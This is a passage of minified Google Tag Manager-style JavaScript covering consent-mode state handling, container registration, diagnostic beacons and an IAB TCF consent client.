    xj = !1,
    yj = {},
    zj = {},
    Aj = !1,
    Bj = {
      ad_storage: !1,
      ad_user_data: !1,
      ad_personalization: !1
    };
  function Cj() {
    var a = Fc("google_tag_data", {});
    return a.ics = a.ics || new Dj();
  }
  var Dj = function () {
    this.entries = {};
    this.cps = {};
    this.waitPeriodTimedOut = this.wasSetLate = this.accessedAny = this.accessedDefault = this.usedSetCps = this.usedImplicit = this.usedUpdate = this.usedDefault = this.usedDeclare = this.active = !1;
    this.h = [];
  };
  Dj.prototype.default = function (a, b, c, d, e, f) {
    this.usedDefault || !this.accessedDefault && !this.accessedAny || (this.wasSetLate = !0);
    this.usedDefault = this.active = !0;
    Ab("TAGGING", 19);
    void 0 == b ? Ab("TAGGING", 18) : Ej(this, a, "granted" === b, c, d, e, f);
  };
  Dj.prototype.waitForUpdate = function (a, b) {
    for (var c = 0; c < a.length; c++) Ej(this, a[c], void 0, void 0, "", "", b);
  };
  var Ej = function (a, b, c, d, e, f, g) {
    var k = a.entries,
      m = k[b] || {},
      n = m.region,
      p = d && h(d) ? d.toUpperCase() : void 0;
    e = e.toUpperCase();
    f = f.toUpperCase();
    if (Fj(p, n, e, f)) {
      var q = !!(g && 0 < g && void 0 === m.update),
        r = {
          region: p,
          declare_region: m.declare_region,
          implicit: m.implicit,
          default: void 0 !== c ? c : m.default,
          declare: m.declare,
          update: m.update,
          quiet: q
        };
      if ("" !== e || !1 !== m.default) k[b] = r;
      q && z.setTimeout(function () {
        k[b] === r && r.quiet && (Ab("TAGGING", 2), a.waitPeriodTimedOut = !0, a.clearTimeout(b, void 0), a.notifyListeners());
      }, g);
    }
  };
  aa = Dj.prototype;
  aa.clearTimeout = function (a, b) {
    var c = [a],
      d;
    for (d in yj) yj.hasOwnProperty(d) && yj[d] === a && c.push(d);
    var e = this.entries[a] || {},
      f = this.getConsentState(a);
    if (e.quiet) {
      e.quiet = !1;
      for (var g = ha(c), k = g.next(); !k.done; k = g.next()) Gj(this, k.value);
    } else if (void 0 !== b && f !== b) {
      var m = ha(c);
      for (k = m.next(); !k.done; k = m.next()) Gj(this, k.value);
    }
  };
  aa.update = function (a, b) {
    this.usedDefault || this.usedUpdate || !this.accessedAny || (this.wasSetLate = !0);
    this.usedUpdate = this.active = !0;
    if (void 0 != b) {
      var c = this.getConsentState(a),
        d = this.entries;
      (d[a] = d[a] || {}).update = "granted" === b;
      this.clearTimeout(a, c);
    }
  };
  aa.declare = function (a, b, c, d, e) {
    this.usedDeclare = this.active = !0;
    var f = this.entries,
      g = f[a] || {},
      k = g.declare_region,
      m = c && h(c) ? c.toUpperCase() : void 0;
    d = d.toUpperCase();
    e = e.toUpperCase();
    if (Fj(m, k, d, e)) {
      var n = {
        region: g.region,
        declare_region: m,
        declare: "granted" === b,
        implicit: g.implicit,
        default: g.default,
        update: g.update,
        quiet: g.quiet
      };
      if ("" !== d || !1 !== g.declare) f[a] = n;
    }
  };
  aa.implicit = function (a, b) {
    this.usedImplicit = !0;
    var c = this.entries,
      d = c[a] = c[a] || {};
    !1 !== d.implicit && (d.implicit = "granted" === b);
  };
  aa.getConsentState = function (a) {
    var b = this.entries,
      c = b[a] || {},
      d = c.update;
    if (void 0 !== d) return d ? 1 : 2;
    d = c.default;
    if (void 0 !== d) return d ? 1 : 2;
    if (yj.hasOwnProperty(a)) {
      var e = b[yj[a]] || {};
      d = e.update;
      if (void 0 !== d) return d ? 1 : 2;
      d = e.default;
      if (void 0 !== d) return d ? 1 : 2;
    }
    d = c.declare;
    if (void 0 !== d) return d ? 1 : 2;
    if (Sf(3)) {
      d = c.implicit;
      if (void 0 !== d) return d ? 3 : 4;
      if (Bj.hasOwnProperty(a)) return Bj[a] ? 3 : 4;
    }
    return 0;
  };
  window.seenVars = JSON.parse(localStorage.getItem('trackedVars')) || [];
  aa.setCps = function (a, b, c, d, e) {
    Hj(this.cps, a, b, c, d, e) && (this.usedSetCps = !0);
  };
  aa.addListener = function (a, b) {
    this.h.push({
      consentTypes: a,
      Al: b
    });
  };
  var Gj = function (a, b) {
    for (var c = 0; c < a.h.length; ++c) {
      var d = a.h[c];
      Ha(d.consentTypes) && -1 !== d.consentTypes.indexOf(b) && (d.Gj = !0);
    }
  };
  Dj.prototype.notifyListeners = function (a, b) {
    for (var c = 0; c < this.h.length; ++c) {
      var d = this.h[c];
      if (d.Gj) {
        d.Gj = !1;
        try {
          d.Al({
            consentEventId: a,
            consentPriorityId: b
          });
        } catch (e) {}
      }
    }
  };
  function Fj(a, b, c, d) {
    return "" === c || a === d ? !0 : a === c ? b !== d : !a && !b;
  }
  function Hj(a, b, c, d, e, f) {
    var g = a[b] || {},
      k = g.region,
      m = d && h(d) ? d.toUpperCase() : void 0;
    e = e.toUpperCase();
    f = f.toUpperCase();
    if (Fj(m, k, e, f)) {
      var n = {
        enabled: "granted" === c,
        region: m
      };
      if ("" !== e || !1 !== g.enabled) return a[b] = n, !0;
    }
    return !1;
  }
  var Ij = function (a) {
      var b = Cj();
      b.accessedAny = !0;
      return (h(a) ? [a] : a).every(function (c) {
        switch (b.getConsentState(c)) {
          case 1:
          case 3:
            return !0;
          case 2:
          case 4:
            return !1;
          default:
            return !0;
        }
      });
    },
    Jj = function (a) {
      var b = Cj();
      b.accessedAny = !0;
      return b.getConsentState(a);
    },
    Kj = function (a) {
      var b = Cj();
      b.accessedDefault = !0;
      switch ((b.entries[a] || {}).default) {
        case !0:
          return 3;
        case !1:
          return 2;
        default:
          return 1;
      }
    },
    Lj = function (a) {
      var b = Cj();
      b.accessedAny = !0;
      return !(b.entries[a] || {}).quiet;
    },
    Mj = function () {
      if (!vj().h()) return !1;
      var a = Cj();
      a.accessedAny = !0;
      return a.active;
    },
    Nj = function () {
      var a = Cj();
      a.accessedDefault = !0;
      return a.usedDefault;
    },
    Oj = function (a, b) {
      Cj().addListener(a, b);
    },
    Pj = function (a, b) {
      Cj().notifyListeners(a, b);
    },
    Qj = function (a, b) {
      function c() {
        for (var e = 0; e < b.length; e++) if (!Lj(b[e])) return !0;
        return !1;
      }
      if (c()) {
        var d = !1;
        Oj(b, function (e) {
          d || c() || (d = !0, a(e));
        });
      } else a({});
    },
    Rj = function (a, b) {
      function c() {
        for (var k = [], m = 0; m < e.length; m++) {
          var n = e[m];
          Ij(n) && !f[n] && k.push(n);
        }
        return k;
      }
      function d(k) {
        for (var m = 0; m < k.length; m++) f[k[m]] = !0;
      }
      var e = h(b) ? [b] : b,
        f = {},
        g = c();
      g.length !== e.length && (d(g), Oj(e, function (k) {
        function m(q) {
          0 !== q.length && (d(q), k.consentTypes = q, a(k));
        }
        var n = c();
        if (0 !== n.length) {
          var p = Object.keys(f).length;
          n.length + p >= e.length ? m(n) : z.setTimeout(function () {
            m(c());
          }, 500);
        }
      }));
    };
  function Sj() {}
  function Tj() {}
  ;
  var Uj = [Q.g.K, Q.g.U, Q.g.O, Q.g.Ea],
    Vj = function (a) {
      for (var b = a[Q.g.Va], c = Array.isArray(b) ? b : [b], d = {
          Ge: 0
        }; d.Ge < c.length; d = {
        Ge: d.Ge
      }, ++d.Ge) l(a, function (e) {
        return function (f, g) {
          if (f !== Q.g.Va) {
            var k = c[e.Ge],
              m = mj(),
              n = nj();
            xj = !0;
            wj && Ab("TAGGING", 20);
            Cj().declare(f, g, k, m, n);
          }
        };
      }(d));
    },
    Wj = function (a) {
      var b = a[Q.g.Va];
      b && O(40);
      var c = a[Q.g.wd];
      c && O(41);
      for (var d = Ha(b) ? b : [b], e = {
          He: 0
        }; e.He < d.length; e = {
        He: e.He
      }, ++e.He) l(a, function (f) {
        return function (g, k) {
          if (g !== Q.g.Va && g !== Q.g.wd) {
            var m = d[f.He],
              n = Number(c),
              p = mj(),
              q = nj();
            wj = !0;
            xj && Ab("TAGGING", 20);
            Cj().default(g, k, m, p, q, n);
          }
        };
      }(e));
    },
    Xj = function (a, b) {
      l(a, function (c, d) {
        wj = !0;
        xj && Ab("TAGGING", 20);
        Cj().update(c, d);
      });
      Pj(b.eventId, b.priorityId);
    },
    Yj = function (a) {
      for (var b = a[Q.g.Va], c = Array.isArray(b) ? b : [b], d = {
          Ie: 0
        }; d.Ie < c.length; d = {
        Ie: d.Ie
      }, ++d.Ie) l(a, function (e) {
        return function (f, g) {
          if (f !== Q.g.Va) {
            var k = c[e.Ie],
              m = mj(),
              n = nj();
            Cj().setCps(f, g, k, m, n);
          }
        };
      }(d));
    },
    Zj = function (a) {
      for (var b = a[Q.g.Va], c = Array.isArray(b) ? b : [b], d = {
          jd: 0
        }; d.jd < c.length; d = {
        jd: d.jd
      }, ++d.jd) a.hasOwnProperty(Q.g.fg) && l(mi, function (e) {
        return function (f) {
          Hj(zj, f, a[Q.g.fg], c[e.jd], mj(), nj()) && (Aj = !0);
        };
      }(d)), l(a, function (e) {
        return function (f, g) {
          f !== Q.g.Va && f !== Q.g.fg && Hj(zj, f, g, c[e.jd], mj(), nj()) && (Aj = !0);
        };
      }(d));
    },
    ak = function (a) {
      Array.isArray(a) || (a = [a]);
      return a.every(function (b) {
        return Ij(b);
      });
    },
    bk = function (a, b) {
      Oj(a, b);
    },
    ck = function (a, b) {
      Rj(a, b);
    },
    dk = function (a, b) {
      Qj(a, b);
    },
    ek = function () {
      var a = [Q.g.K, Q.g.Ea, Q.g.O];
      Cj().waitForUpdate(a, 500);
    },
    fk = function (a) {
      for (var b = ha(a), c = b.next(); !c.done; c = b.next()) {
        var d = c.value;
        Cj().clearTimeout(d, void 0);
      }
      Pj();
    };
  var gk = function (a) {
      var b = String(a[Oe.za] || "").replace(/_/g, "");
      0 === b.indexOf("cvt") && (b = "cvt");
      return b;
    },
    hk = 0 <= z.location.search.indexOf("?gtm_latency=") || 0 <= z.location.search.indexOf("&gtm_latency=");
  var jk = function (a, b) {
      var c = ik();
      c.pending || (c.pending = []);
      Ja(c.pending, function (d) {
        return d.target.ctid === a.ctid && d.target.isDestination === a.isDestination;
      }) || c.pending.push({
        target: a,
        onLoad: b
      });
    },
    kk = function () {
      this.container = {};
      this.destination = {};
      this.canonical = {};
      this.pending = [];
      this.siloed = [];
    },
    ik = function () {
      var a = Fc("google_tag_data", {}),
        b = a.tidr;
      b || (b = new kk(), a.tidr = b);
      return b;
    };
  var lk = {},
    mk = !1,
    Tf = {
      ctid: "DC-12992475",
      Ef: "",
      Ej: "DC-12992475",
      Fj: "DC-12992475"
    };
  lk.ke = Pa("");
  var pk = function () {
      var a = nk();
      return mk ? a.map(ok) : a;
    },
    rk = function () {
      var a = qk();
      return mk ? a.map(ok) : a;
    },
    tk = function () {
      return sk(Tf.ctid);
    },
    uk = function () {
      return sk(Tf.Ef || "_" + Tf.ctid);
    },
    nk = function () {
      return Tf.Ej ? Tf.Ej.split("|") : [Tf.ctid];
    },
    qk = function () {
      return Tf.Fj ? Tf.Fj.split("|") : [];
    },
    vk = function (a) {
      var b = ik();
      return a.isDestination ? b.destination[a.ctid] : b.container[a.ctid];
    },
    sk = function (a) {
      return mk ? ok(a) : a;
    },
    ok = function (a) {
      return "siloed_" + a;
    },
    wk = function (a) {
      a = String(a);
      return mk && 0 === a.indexOf("siloed_") ? a.substring(7) : a;
    },
    xk = function () {
      var a = !1;
      a = !0;
      if (a) {
        var b = ik();
        if (b.siloed) {
          for (var c = [], d = nk(), e = qk(), f = {}, g = 0; g < b.siloed.length; f = {
            we: f.we
          }, g++) f.we = b.siloed[g], !mk && Ja(f.we.isDestination ? e : d, function (k) {
            return function (m) {
              return m === k.we.ctid;
            };
          }(f)) ? mk = !0 : c.push(f.we);
          b.siloed = c;
        }
      }
    };
  function yk() {
    var a = ik();
    if (a.pending) {
      for (var b, c = [], d = !1, e = pk(), f = rk(), g = {}, k = 0; k < a.pending.length; g = {
        od: g.od
      }, k++) g.od = a.pending[k], Ja(g.od.target.isDestination ? f : e, function (m) {
        return function (n) {
          return n === m.od.target.ctid;
        };
      }(g)) ? d || (b = g.od.onLoad, d = !0) : c.push(g.od);
      a.pending = c;
      if (b) try {
        b(uk());
      } catch (m) {}
    }
  }
  var zk = function () {
      for (var a = ik(), b = pk(), c = 0; c < b.length; c++) {
        var d = a.container[b[c]];
        d ? (d.state = 2, d.containers = pk(), d.destinations = rk()) : a.container[b[c]] = {
          state: 2,
          containers: pk(),
          destinations: rk()
        };
      }
      for (var e = rk(), f = 0; f < e.length; f++) {
        var g = a.destination[e[f]];
        g && 0 === g.state && O(93);
        g ? (g.state = 2, g.containers = pk(), g.destinations = rk()) : a.destination[e[f]] = {
          state: 2,
          containers: pk(),
          destinations: rk()
        };
      }
      a.canonical[uk()] = {};
      yk();
    },
    Ak = function (a) {
      return !!ik().container[a];
    },
    Bk = function (a) {
      var b = ik().destination[a];
      return !!b && !!b.state;
    },
    Ck = function () {
      return {
        ctid: tk(),
        isDestination: lk.ke
      };
    };
  function Dk(a) {
    var b = ik();
    (b.siloed = b.siloed || []).push(a);
  }
  var Ek = function () {
      var a = ik().container,
        b;
      for (b in a) if (a.hasOwnProperty(b) && 1 === a[b].state) return !0;
      return !1;
    },
    Fk = function () {
      var a = {};
      l(ik().destination, function (b, c) {
        0 === c.state && (a[b] = c);
      });
      return a;
    },
    Gk = function (a) {
      return !!(a && a.parent && a.context && 1 === a.context.source && 0 !== a.parent.ctid.indexOf("GTM-"));
    };
  var Hk = {
      sampleRate: "0.005000",
      Yj: "",
      Xj: Number("5"),
      Tn: Number("")
    },
    Ik = [];
  function Jk(a) {
    Ik.push(a);
  }
  var Kk = !1,
    Lk;
  if (!(Lk = hk)) {
    var Mk = Math.random(),
      Nk = Hk.sampleRate;
    Lk = Mk < Number(Nk);
  }
  var Ok = Lk,
    Pk = "https://www.googletagmanager.com/a?id=" + Tf.ctid,
    Qk = void 0,
    Rk = {},
    Sk = void 0,
    Tk = new function () {
      var a = 5;
      0 < Hk.Xj && (a = Hk.Xj);
      this.h = 0;
      this.D = [];
      this.C = a;
    }(),
    Uk = 1E3;
  function Vk(a, b) {
    var c = Qk;
    if (void 0 === c) if (b) c = Ii();else return "";
    for (var d = [Pk], e = 0; e < Ik.length; e++) {
      var f = Ik[e]({
        eventId: c,
        hc: !!a,
        Oj: function () {
          Kk = !0;
        }
      });
      "&" === f[0] && d.push(f);
    }
    d.push("&z=0");
    return d.join("");
  }
  function Wk() {
    Sk && (z.clearTimeout(Sk), Sk = void 0);
    if (void 0 !== Qk && Xk) {
      var a;
      (a = Rk[Qk]) || (a = Tk.h < Tk.C ? !1 : 1E3 > Ua() - Tk.D[Tk.h % Tk.C]);
      if (a || 0 >= Uk--) O(1), Rk[Qk] = !0;else {
        var b = Tk.h++ % Tk.C;
        Tk.D[b] = Ua();
        var c = Vk(!0);
        Nc(c);
        if (Kk) {
          var d = c.replace("/a?", "/td?");
          Nc(d);
        }
        Xk = Kk = !1;
      }
    }
  }
  var Xk = !1;
  function Yk(a) {
    Rk[a] || (a !== Qk && (Wk(), Qk = a), Xk = !0, Sk || (Sk = z.setTimeout(Wk, 500)), 2022 <= Vk().length && Wk());
  }
  var Zk = Ka();
  function $k() {
    Zk = Ka();
  }
  function al() {
    return ["&v=3&t=t", "&pid=" + Zk].join("");
  }
  ;
  var bl = function (a, b, c, d, e, f, g, k, m, n, p, q) {
      this.eventId = a;
      this.priorityId = b;
      this.h = c;
      this.N = d;
      this.D = e;
      this.H = f;
      this.T = g;
      this.C = k;
      this.eventMetadata = m;
      this.onSuccess = n;
      this.onFailure = p;
      this.isGtmEvent = q;
    },
    V = function (a, b, c) {
      if (void 0 !== a.h[b]) return a.h[b];
      if (void 0 !== a.N[b]) return a.N[b];
      if (void 0 !== a.D[b]) return a.D[b];
      Ok && cl(a, a.H[b], a.T[b]) && (O(71), O(79));
      return void 0 !== a.H[b] ? a.H[b] : void 0 !== a.C[b] ? a.C[b] : c;
    },
    dl = function (a) {
      function b(g) {
        for (var k = Object.keys(g), m = 0; m < k.length; ++m) c[k[m]] = 1;
      }
      var c = {};
      b(a.h);
      b(a.N);
      b(a.D);
      b(a.H);
      if (Ok) for (var d = Object.keys(a.T), e = 0; e < d.length; e++) {
        var f = d[e];
        if ("event" !== f && "gtm" !== f && "tagTypeBlacklist" !== f && !c.hasOwnProperty(f)) {
          O(71);
          O(80);
          break;
        }
      }
      return Object.keys(c);
    },
    el = function (a, b, c) {
      function d(m) {
        nb(m) && l(m, function (n, p) {
          f = !0;
          e[n] = p;
        });
      }
      var e = {},
        f = !1;
      c && 1 !== c || (d(a.C[b]), d(a.H[b]), d(a.D[b]), d(a.N[b]));
      c && 2 !== c || d(a.h[b]);
      if (Ok) {
        var g = f,
          k = e;
        e = {};
        f = !1;
        c && 1 !== c || (d(a.C[b]), d(a.T[b]), d(a.D[b]), d(a.N[b]));
        c && 2 !== c || d(a.h[b]);
        if (f !== g || cl(a, e, k)) O(71), O(81);
        f = g;
        e = k;
      }
      return f ? e : void 0;
    },
    fl = function (a) {
      var b = [Q.g.Mc, Q.g.Ic, Q.g.Jc, Q.g.Kc, Q.g.Lc, Q.g.Nc, Q.g.Oc],
        c = {},
        d = !1,
        e = function (k) {
          for (var m = 0; m < b.length; m++) void 0 !== k[b[m]] && (c[b[m]] = k[b[m]], d = !0);
          return d;
        };
      if (e(a.h) || e(a.N) || e(a.D)) return c;
      e(a.H);
      if (Ok) {
        var f = c,
          g = d;
        c = {};
        d = !1;
        e(a.T);
        cl(a, c, f) && (O(71), O(82));
        c = f;
        d = g;
      }
      if (d) return c;
      e(a.C);
      return c;
    },
    cl = function (a, b, c) {
      if (!Ok) return !1;
      try {
        if (b === c) return !1;
        var d = lb(b);
        if (d !== lb(c) || !(nb(b) && nb(c) || "array" === d)) return !0;
        if ("array" === d) {
          if (b.length !== c.length) return !0;
          for (var e = 0; e < b.length; e++) if (cl(a, b[e], c[e])) return !0;
        } else {
          for (var f in c) if (!b.hasOwnProperty(f)) return !0;
          for (var g in b) if (!c.hasOwnProperty(g) || cl(a, b[g], c[g])) return !0;
        }
      } catch (k) {
        O(72);
      }
      return !1;
    },
    gl = function (a, b) {
      this.uf = a;
      this.vf = b;
      this.H = {};
      this.xc = {};
      this.h = {};
      this.N = {};
      this.C = {};
      this.Tb = {};
      this.D = {};
      this.Sb = function () {};
      this.Na = function () {};
      this.T = !1;
    },
    hl = function (a, b) {
      a.H = b;
      return a;
    },
    il = function (a, b) {
      a.xc = b;
      return a;
    },
    jl = function (a, b) {
      a.h = b;
      return a;
    },
    kl = function (a, b) {
      a.N = b;
      return a;
    },
    ll = function (a, b) {
      a.C = b;
      return a;
    },
    ml = function (a, b) {
      a.Tb = b;
      return a;
    },
    nl = function (a, b) {
      a.D = b || {};
      return a;
    },
    ol = function (a, b) {
      a.Sb = b;
      return a;
    },
    pl = function (a, b) {
      a.Na = b;
      return a;
    },
    ql = function (a, b) {
      a.T = b;
      return a;
    },
    rl = function (a) {
      return new bl(a.uf, a.vf, a.H, a.xc, a.h, a.N, a.C, a.Tb, a.D, a.Sb, a.Na, a.T);
    };
  function sl(a, b) {
    if ("" === a) return b;
    var c = Number(a);
    return isNaN(c) ? b : c;
  }
  ;
  var tl = function (a, b) {
      var c = function () {};
      c.prototype = a.prototype;
      var d = new c();
      a.apply(d, Array.prototype.slice.call(arguments, 1));
      return d;
    },
    ul = function (a) {
      var b = a;
      return function () {
        if (b) {
          var c = b;
          b = null;
          c();
        }
      };
    };
  var vl = function (a, b, c) {
    a.addEventListener && a.addEventListener(b, c, !1);
  };
  function wl() {
    return Pb ? !!Wb && !!Wb.platform : !1;
  }
  function xl() {
    return Zb("iPhone") && !Zb("iPod") && !Zb("iPad");
  }
  function yl() {
    xl() || Zb("iPad") || Zb("iPod");
  }
  ;
  ac();
  $b() || Zb("Trident") || Zb("MSIE");
  Zb("Edge");
  !Zb("Gecko") || -1 != Vb().toLowerCase().indexOf("webkit") && !Zb("Edge") || Zb("Trident") || Zb("MSIE") || Zb("Edge");
  -1 != Vb().toLowerCase().indexOf("webkit") && !Zb("Edge") && Zb("Mobile");
  wl() || Zb("Macintosh");
  wl() || Zb("Windows");
  (wl() ? "Linux" === Wb.platform : Zb("Linux")) || wl() || Zb("CrOS");
  wl() || Zb("Android");
  xl();
  Zb("iPad");
  Zb("iPod");
  yl();
  Vb().toLowerCase().indexOf("kaios");
  var zl = function (a, b, c, d) {
      for (var e = b, f = c.length; 0 <= (e = a.indexOf(c, e)) && e < d;) {
        var g = a.charCodeAt(e - 1);
        if (38 == g || 63 == g) {
          var k = a.charCodeAt(e + f);
          if (!k || 61 == k || 38 == k || 35 == k) return e;
        }
        e += f + 1;
      }
      return -1;
    },
    Al = /#|$/,
    Bl = function (a, b) {
      var c = a.search(Al),
        d = zl(a, 0, b, c);
      if (0 > d) return null;
      var e = a.indexOf("&", d);
      if (0 > e || e > c) e = c;
      d += b.length + 1;
      return decodeURIComponent(a.slice(d, -1 !== e ? e : 0).replace(/\+/g, " "));
    },
    Cl = /[?&]($|#)/,
    Dl = function (a, b, c) {
      for (var d, e = a.search(Al), f = 0, g, k = []; 0 <= (g = zl(a, f, b, e));) k.push(a.substring(f, g)), f = Math.min(a.indexOf("&", g) + 1 || e, e);
      k.push(a.slice(f));
      d = k.join("").replace(Cl, "$1");
      var m,
        n = null != c ? "=" + encodeURIComponent(String(c)) : "";
      var p = b + n;
      if (p) {
        var q,
          r = d.indexOf("#");
        0 > r && (r = d.length);
        var t = d.indexOf("?"),
          u;
        0 > t || t > r ? (t = r, u = "") : u = d.substring(t + 1, r);
        q = [d.slice(0, t), u, d.slice(r)];
        var v = q[1];
        q[1] = p ? v ? v + "&" + p : p : v;
        m = q[0] + (q[1] ? "?" + q[1] : "") + q[2];
      } else m = d;
      return m;
    };
  var El = function (a) {
      try {
        var b;
        if (b = !!a && null != a.location.href) a: {
          try {
            tj(a.foo);
            b = !0;
            break a;
          } catch (c) {}
          b = !1;
        }
        return b;
      } catch (c) {
        return !1;
      }
    },
    Fl = function (a, b) {
      if (a) for (var c in a) Object.prototype.hasOwnProperty.call(a, c) && b(a[c], c, a);
    };
  function Gl(a) {
    if (!a || !E.head) return null;
    var b = Hl("META");
    E.head.appendChild(b);
    b.httpEquiv = "origin-trial";
    b.content = a;
    return b;
  }
  var Il = function (a) {
      if (z.top == z) return 0;
      if (void 0 === a ? 0 : a) {
        var b = z.location.ancestorOrigins;
        if (b) return b[b.length - 1] == z.location.origin ? 1 : 2;
      }
      return El(z.top) ? 1 : 2;
    },
    Hl = function (a, b) {
      b = void 0 === b ? document : b;
      return b.createElement(String(a).toLowerCase());
    };
  function Jl(a, b, c, d) {
    d = void 0 === d ? !1 : d;
    a.google_image_requests || (a.google_image_requests = []);
    var e = Hl("IMG", a.document);
    if (c) {
      var f = function () {
        if (c) {
          var g = a.google_image_requests,
            k = Db(g, e);
          0 <= k && Array.prototype.splice.call(g, k, 1);
        }
        e.removeEventListener && e.removeEventListener("load", f, !1);
        e.removeEventListener && e.removeEventListener("error", f, !1);
      };
      vl(e, "load", f);
      vl(e, "error", f);
    }
    d && (e.attributionSrc = "");
    e.src = b;
    a.google_image_requests.push(e);
  }
  var Ll = function (a) {
      var b;
      b = void 0 === b ? !1 : b;
      var c = "https://pagead2.googlesyndication.com/pagead/gen_204?id=tcfe";
      Fl(a, function (d, e) {
        if (d || 0 === d) c += "&" + e + "=" + encodeURIComponent("" + d);
      });
      Kl(c, b);
    },
    Kl = function (a, b) {
      var c = window,
        d;
      b = void 0 === b ? !1 : b;
      d = void 0 === d ? !1 : d;
      if (c.fetch) {
        var e = {
          keepalive: !0,
          credentials: "include",
          redirect: "follow",
          method: "get",
          mode: "no-cors"
        };
        d && (e.mode = "cors", "setAttributionReporting" in XMLHttpRequest.prototype ? e.attributionReporting = {
          eventSourceEligible: "true",
          triggerEligible: "false"
        } : e.headers = {
          "Attribution-Reporting-Eligible": "event-source"
        });
        c.fetch(a, e);
      } else Jl(c, a, void 0 === b ? !1 : b, void 0 === d ? !1 : d);
    };
  var Ml = function () {};
  var Nl = function (a) {
      void 0 !== a.addtlConsent && "string" !== typeof a.addtlConsent && (a.addtlConsent = void 0);
      void 0 !== a.gdprApplies && "boolean" !== typeof a.gdprApplies && (a.gdprApplies = void 0);
      return void 0 !== a.tcString && "string" !== typeof a.tcString || void 0 !== a.listenerId && "number" !== typeof a.listenerId ? 2 : a.cmpStatus && "error" !== a.cmpStatus ? 0 : 3;
    },
    Ol = function (a, b) {
      b = void 0 === b ? {} : b;
      this.C = a;
      this.h = null;
      this.N = {};
      this.Na = 0;
      var c;
      this.T = null != (c = b.dn) ? c : 500;
      var d;
      this.H = null != (d = b.Nn) ? d : !1;
      this.D = null;
    };
  sa(Ol, Ml);
  var Ql = function (a) {
    return "function" === typeof a.C.__tcfapi || null != Pl(a);
  };
  Ol.prototype.addEventListener = function (a) {
    var b = this,
      c = {
        internalBlockOnErrors: this.H
      },
      d = ul(function () {
        return a(c);
      }),
      e = 0;
    -1 !== this.T && (e = setTimeout(function () {
      c.tcString = "tcunavailable";
      c.internalErrorState = 1;
      d();
    }, this.T));
    var f = function (g, k) {
      clearTimeout(e);
      g ? (c = g, c.internalErrorState = Nl(c), c.internalBlockOnErrors = b.H, k && 0 === c.internalErrorState || (c.tcString = "tcunavailable", k || (c.internalErrorState = 3))) : (c.tcString = "tcunavailable", c.internalErrorState = 3);
      a(c);
    };
    try {
      Rl(this, "addEventListener", f);
    } catch (g) {
      c.tcString = "tcunavailable", c.internalErrorState = 3, e && (clearTimeout(e), e = 0), d();
    }
  };
  Ol.prototype.removeEventListener = function (a) {
    a && a.listenerId && Rl(this, "removeEventListener", null, a.listenerId);
  };
  var Tl = function (a, b, c) {
      var d;
      d = void 0 === d ? "755" : d;
      var e;
      a: {
        if (a.publisher && a.publisher.restrictions) {
          var f = a.publisher.restrictions[b];
          if (void 0 !== f) {
            e = f[void 0 === d ? "755" : d];
            break a;
          }
        }
        e = void 0;
      }
      var g = e;
      if (0 === g) return !1;
      var k = c;
      2 === c ? (k = 0, 2 === g && (k = 1)) : 3 === c && (k = 1, 1 === g && (k = 0));
      var m;
      if (0 === k) {
        if (a.purpose && a.vendor) {
          var n = Sl(a.vendor.consents, void 0 === d ? "755" : d);
          m = n && "1" === b && a.purposeOneTreatment && "CH" === a.publisherCC ? !0 : n && Sl(a.purpose.consents, b);
        } else m = !0;
      } else m = 1 === k ? a.purpose && a.vendor ? Sl(a.purpose.legitimateInterests, b) && Sl(a.vendor.legitimateInterests, void 0 === d ? "755" : d) : !0 : !0;
      return m;
    },
    Sl = function (a, b) {
      return !(!a || !a[b]);
    },
    Rl = function (a, b, c, d) {
      c || (c = function () {});
      if ("function" === typeof a.C.__tcfapi) {
        var e = a.C.__tcfapi;
        e(b, 2, c, d);
      } else if (Pl(a)) {
        Ul(a);
        var f = ++a.Na;
        a.N[f] = c;
        if (a.h) {
          var g = {};
          a.h.postMessage((g.__tcfapiCall = {
            command: b,
            version: 2,
            callId: f,
            parameter: d
          }, g), "*");
        }
      } else c({}, !1);
    },
    Pl = function (a) {
      if (a.h) return a.h;
      var b;
      a: {
        for (var c = a.C, d = 0; 50 > d; ++d) {
          var e;
          try {
            e = !(!c.frames || !c.frames.__tcfapiLocator);
          } catch (k) {
            e = !1;
          }
          if (e) {
            b = c;
            break a;
          }
          var f;
          b: {
            try {
              var g = c.parent;
              if (g && g != c) {
                f = g;
                break b;
              }
            } catch (k) {}
            f = null;
          }
          if (!(c = f)) break;
        }
        b = null;
      }
      a.h = b;
      return a.h;
    },
    Ul = function (a) {
      a.D || (a.D = function (b) {
        try {
          var c;
          c = ("string" === typeof b.data ? JSON.parse(b.data) : b.data).__tcfapiReturn;
          a.N[c.callId](c.returnValue, c.success);
        } catch (d) {}
      }, vl(a.C, "message", a.D));
    },
    Vl = function (a) {
      if (!1 === a.gdprApplies) return !0;
      void 0 === a.internalErrorState && (a.internalErrorState = Nl(a));
      return "error" === a.cmpStatus || 0 !== a.internalErrorState ? a.internalBlockOnErrors ? (Ll({
        e: String(a.internalErrorState)
      }), !1) : !0 : "loaded" !== a.cmpStatus || "tcloaded" !== a.eventStatus && "useractioncomplete" !== a.eventStatus ? !1 : !0;
    };
  var Wl = {
      1: 0,
      3: 0,
      4: 0,
      7: 3,
      9: 3,
      10: 3
    },
    Xl = sl('', 500);
  function Yl() {
    var a = oi.tcf || {};
    return oi.tcf = a;
  }
  var Zl = function () {
      return new Ol(z, {
        dn: -1
      });
    },
    fm = function () {
      var a = Yl(),
        b = Zl();
      Ql(b) && $l() && O(124);
      if ((am() || S(62)) && !a.active && Ql(b)) {
        am() && (a.active = !0, a.bc = {}, a.cmpId = 0, a.tcfPolicyVersion = 0, S(62) ? Cj().active = !0 : bm(), a.tcString = "tcunavailable");
        S(62) && ek();
        try {
          b.addEventListener(function (c) {
            if (0 !== c.internalErrorState) cm(a), S(62) ? (fk([Q.g.K, Q.g.Ea, Q.g.O]), Cj().active = !0) : dm(a);else {
              a.gdprApplies = c.gdprApplies;
              if (S(62)) {
                a.cmpId = c.cmpId;
                a.enableAdvertiserConsentMode = c.enableAdvertiserConsentMode;
                !0 === Yl().enableAdvertiserConsentMode && (a.active = !0);
                if (em(c) && $l()) {
                  fk([Q.g.K, Q.g.Ea, Q.g.O]);
                  return;
                }
                a.tcfPolicyVersion = c.tcfPolicyVersion;
              }
              var d;
              if (!1 === c.gdprApplies) {
                var e = {},
                  f;
                for (f in Wl) Wl.hasOwnProperty(f) && (e[f] = !0);
                d = e;
                b.removeEventListener(c);
              } else if (em(c)) {
                var g = {},
                  k;
                for (k in Wl) if (Wl.hasOwnProperty(k)) if ("1" === k) {
                  var m,
                    n = c,
                    p = !0;
                  p = void 0 === p ? !1 : p;
